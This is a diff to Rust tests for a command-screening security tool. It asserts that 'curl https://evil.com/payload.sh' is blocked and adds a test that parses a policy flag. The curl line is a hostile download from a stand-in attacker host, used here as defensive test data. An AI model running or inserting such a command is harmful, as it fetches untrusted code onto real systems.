@@ -472,8 +472,24 @@ fn test_blocklist_ignores_comments() {
 
     let cwd = repo.path().to_str().unwrap();
     let verdict = analyze_exec("curl https://evil.com/payload.sh", cwd);
-    assert!(verdict
-        .findings
-        .iter()
-        .any(|f| f.rule_id == RuleId::PolicyBlocklisted));
+    assert_eq!(verdict.action, Action::Block);
+}
+
+// ---------------------------------------------------------------------------
+// vet integration tests
+// ---------------------------------------------------------------------------
+
+#[test]
+fn test_use_vet_runner_parsed() {
+    let policy = r#"
+fail_mode: open
+use_vet_runner: true
+"#;
+    let repo = make_repo(policy);
+    let policy = tirith_core::policy::Policy::discover(Some(repo.path().to_str().unwrap()));
+
+    assert!(
+        policy.use_vet_runner,
+        "Policy should correctly parse use_vet_runner: true"
+    );
 }
